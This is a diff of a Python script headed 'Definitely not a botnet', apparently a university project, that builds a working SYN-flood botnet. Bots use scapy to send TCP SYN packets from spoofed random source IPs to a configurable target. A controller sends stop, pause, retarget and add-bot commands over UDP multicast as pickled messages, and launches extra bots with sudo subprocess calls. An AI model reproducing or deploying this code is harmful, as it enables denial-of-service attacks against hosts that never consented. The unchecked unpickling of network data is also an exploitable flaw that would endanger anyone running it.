@@ -1,5 +1,6 @@
 #Definitely not a botnet
 import base64
+from cgi import print_form
 from random import randint
 import socket
 import struct
@@ -10,11 +11,18 @@ import pickle
 import copy
 import datetime
 import sys
+import subprocess
 
+import fcntl
+import os
 from scapy.all import *
 
 BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits
 
+
+# set sys.stdin non-blocking
+orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
+fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)
 
 def randInt():
 	x = randint(1000,9000)
@@ -23,6 +31,21 @@ def randInt():
 def randomIP():
 	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
 	return ip
+
+def printMenu():
+                menu = """
+                    Available instructions:
+                    "stop" - stop the bots
+                    "status" - view botnet status
+                    "target" - change target
+                    "pause" - pause attack
+                    "resume" - resume attack 
+                    "add" - add a bot
+                    "add x" - add x bots (pausing is recommended ;) )
+                """
+                print(menu)
+                sys.stdout.write("> ")                                              # For that old-school IRC feel
+                sys.stdout.flush()
 class zerg:
     def __init__(self, name: str = ""):
 
@@ -34,43 +57,70 @@ class zerg:
         self.kill = False
         self.pause = False
 
-        self.TARGET = "127.0.0.1"
+        self.TARGET = "192.168.1.102"
         self.TARGETPORT=5000
+
         # --Things for communication with victim server (HTTP,TCP)---
-        #self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.HOST = self.TARGET # "host.docker.internal"
         self.PORT = self.TARGETPORT
 
         # ---Things for communication with brood (Multicast via udp)--
         self.mCastSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.mCastSock.settimeout(0.2)
-        self.MCAST_TTL = struct.pack('b', 1)
-        self.MCAST_GRP ='224.3.29.71'  # what we put here
-        self.MCAST_PORT = 10000
-
         self.mCastSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server_address = ('', 10000)
-        self.mCastSock.bind(server_address)
+        self.mCastSock.settimeout(2)
+        self.MCAST_TTL = struct.pack('b', 2)
+        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
+        
+        self.MCAST_GRP ='224.3.29.71'  # what we put here
+        self.MCAST_PORT =10000
         group = socket.inet_aton(self.MCAST_GRP)
         mreq = struct.pack('4sL', group, socket.INADDR_ANY)
-        self.mCastSock.setsockopt(
-            socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
-        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
-        # Listen for socket activity
-        self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)
+        self.mCastSock.setsockopt( socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+        #self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
+        self.mCastSock.bind(('', 10000))
 
+        # Listen for socket activity
+        if name != "admin":
+            self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)
+        else:
+            self.sel.register(self.mCastSock, selectors.EVENT_READ, self.countBots)
+        self.sel.register(sys.stdin, selectors.EVENT_READ, self.controlInput)   # Listen for input activity
+
+        self.verified = []
         self.peers = {}
 
+        self.latest_pws = list()
+        self.lastTry=0
+        self.id = randint(0,1000000)
+#        self.connect()
 
         hostname = socket.gethostname()
         self.address = socket.gethostbyname(hostname)
         print("I AM:",self.address)
 
+    def countBots(self):
+        try:
+                data, server = self.mCastSock.recvfrom(1024)
+        except socket.timeout:
+            print("aaaaa")
+            return
+        else:
+            recvMSG = pickle.loads(data) 
+
+            if  recvMSG['command'] =="imhere":
+                if recvMSG['id'] in self.peers:
+                    self.peers[recvMSG['id']]=[time.time()] # last seen at: now
+                else:
+                    self.peers[recvMSG['id']]=[time.time()]  # New peer
+            
+        
 
     def sayImHere(self):                           
         '''Send a imhere message'''  # General Kenobi
         msg = {
             'command': 'imhere',
+            'id':self.id
+
         }
         encodedMSG = pickle.dumps(msg)
         
@@ -90,11 +140,12 @@ class zerg:
             socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
         
-    def sayTarget(self,target :str):
+    def sayTarget(self,target :str, port:str):
         '''Send a foundpw message'''  # Win
         msg = {
             'command': 'target',
-            'target':target
+            'target':target,
+            'port':port
         }
         encodedMSG = pickle.dumps(msg)
 
@@ -109,8 +160,8 @@ class zerg:
         }
         encodedMSG = pickle.dumps(msg)
 
-        self.mCastSock.setsockopt(
-            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
+        #self.mCastSock.setsockopt(
+        #    socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
     
     def sayResume(self):
@@ -123,18 +174,17 @@ class zerg:
         self.mCastSock.setsockopt(
             socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
-    def sendMCAST(self, msg):
-        '''Send a message to our peers'''
-        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
-        self.mCastSock.sendto(msg, (self.MCAST_GRP, self.MCAST_PORT))
-        while True:
-            try:
-                data, server = self.mcastSock.recvfrom(1024)
-            except socket.timeout:
-                break
-            else:
-                if server not in self.peers.keys():     # New peer, add them to our contact book
-                    self.peers[server]=[-1,[0,0]]
+
+    def sayAdd(self):
+        '''Send a foundpw message'''  # Win
+        msg = {
+            'command': 'add',
+        }
+        encodedMSG = pickle.dumps(msg)
+
+        self.mCastSock.setsockopt(
+            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
+        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
 
 
     def recvMCAST(self):
@@ -142,6 +192,7 @@ class zerg:
         try:
             data, server = self.mCastSock.recvfrom(1024)
         except socket.timeout:
+            print("aaaaa")
             return
         else:
             recvMSG = pickle.loads(data) 
@@ -157,22 +208,38 @@ class zerg:
 
                
             elif cmd=='stop':
-
+                try:
+                  print("Shutting down...")
+                except BlockingIOError:
+                        pass
                 #print("# PASSWORDS TESTED:", arraySum(self.verified))
                 exit(0) # Shutting down...
             elif cmd=='target':
-                self.s.close()
                 TARGET = recvMSG['target']
-                TARGETPORT = recvMSG['port'] if recvMSG['port'] != "" else TARGETPORT
-                self.HOST = self.TARGET # "host.docker.internal"
-                self.PORT = self.TARGETPORT
-                self.s.connect((self.HOST, self.PORT))
+                
+                TARGETPORT = recvMSG['port'] if recvMSG['port'] != "" else self.TARGETPORT
+                self.HOST = TARGET # "host.docker.internal"
+                self.PORT = TARGETPORT
+                self.TARGET=TARGET
+                self.TARGETPORT = TARGETPORT
+                try:
+                    print(f"Changing target to {TARGET}:{TARGETPORT} ")
+                except BlockingIOError:
+                        pass
+
 
 
             elif cmd == "pause":
+                print("Paused.")
                 self.pause = True
             elif cmd == "resume":
+                print("Resumed.")
                 self.pause = False
+            elif cmd == "add":
+                #os.system('/home/inryatt/Uni/3ano/apsei/CD/slave.py')
+                subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,
+    stderr=subprocess.STDOUT)
+            
             return
 
 
@@ -183,7 +250,7 @@ class zerg:
         s_port = randInt()
         s_eq = randInt()
 
-        w_indow = randInt()   
+        w_indow = randint(60000,65534) 
         IP_Packet = IP()
         IP_Packet.src = randomIP()
         IP_Packet.dst = self.TARGET 
@@ -193,7 +260,7 @@ class zerg:
         TCP_Packet.flags = "S"
         TCP_Packet.seq = s_eq
         TCP_Packet.window = w_indow
-        print("Sending...")
+        
         send(IP_Packet/TCP_Packet, verbose=0)
 
 
@@ -206,30 +273,47 @@ class zerg:
     def controlLoop(self):
 
         try:
+            print("Welcome to Definitely-A-Botnet")
+            printMenu()
             while(True):
-                print("Welcome to Definitely-A-Botnet")
-                menu = """
-                    Available instructions:
-                    "stop" - stop the bots
-                    "status" - view botnet status
-                    "target" - change target
-                    "pause" - pause attack
-                    "resume" - resume attack 
-                """
-                print(menu)
-                inp = input("\n> ")
+                    toDo = self.sel.select(0)
+                    for event, data in toDo:
+                        callback = event.data
+                        msg = callback()
+                    expired = []
+                    for peer in self.peers.keys():
+                        if time.time() - self.peers[peer][0] > 50:
+                            expired+=[peer]
+                    for peer in expired:
+                        self.peers.pop(peer)
+                                
+        except KeyboardInterrupt:
+            print("Shutting Down... Want to stop bots? y/n")
+            inp =input("> ")
+            if inp=="y":
+                self.sayStop()
+            else:
+                print("Goodbye")
+                exit(0)
+
+    def controlInput(self):
+                
+                inp = sys.stdin.read().rstrip("\n")   #Get user's input
+
                 if(inp =="stop"):
                     self.sayStop()
                 elif(inp=="status"):
                     print("Status Screen Goes here") #TODO status screen
+                    
+
+                    print(self.peers.keys())
                     print(f"bots: {len(self.peers.keys())}")
-                elif(inp.contains("target")):
-                    inp=inp.split()
-                    print(f"DEBUG: {inp}")
+                elif("target"in inp):
+                    inp=inp.split(" ")
                     siz = len(inp)
                     if siz <2:
                         print("Missing target!")
-                        break
+                        
                     elif(siz==2):
                         self.sayTarget(inp[1] ,"")
                     elif(siz==3):
@@ -240,35 +324,50 @@ class zerg:
                     self.sayPause()
                 elif(inp=="resume"):
                     self.sayResume()
+                elif("add" in inp):
+                    inp=inp.split(" ")
+                    siz = len(inp)
+                    if siz <2 or inp[1]=="":
+                        times=1
+                    else:
+                        times=int(inp[1])
+                    for i in range(0,times):
+                        #self.sayAdd()
+                        subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,    stderr=subprocess.STDOUT)
+
+
+                    print(f"Adding {times} bots.")
                 else:
                     print("/!\ Invalid Command!")
-        except KeyboardInterrupt:
-            print("Shutting Down... Want to stop bots? y/n")
-            inp =input("> ")
-            if inp=="y":
-                self.sayStop()
-            else:
-                print("Goodbye")
-                exit(0)
-
+                printMenu()
+   
     def loop(self):
         '''Main Loop'''
-
+        count = 0
         if self.isControl:
             self.controlLoop()
         else:
+            print(f"Target:{self.TARGET}:{self.TARGETPORT}")
+
             while not self.kill:                                  
                 #print("all your base are belong to us")         # nice ref :D
 
                 if not self.pause:
-                    for i in range(100):
+                    
+                    for i in range(10):
                             self.attack()
-                            time.sleep(0.5)
+                    count+=1
 
+                    if count%10==0:
+                        count=0
+                        self.sayImHere()
+
+                expired = []
                 for peer in self.peers.keys():
                     if self.peers[peer][0] < time.time() - 5 and time.time() - 15!=0 :
-                        self.peers.pop(peer)
-                        continue
+                        expired+=[peer]
+                for peer in expired:
+                    self.peers.pop(peer)
 
                 toDo = self.sel.select(0)
                 for event, data in toDo:
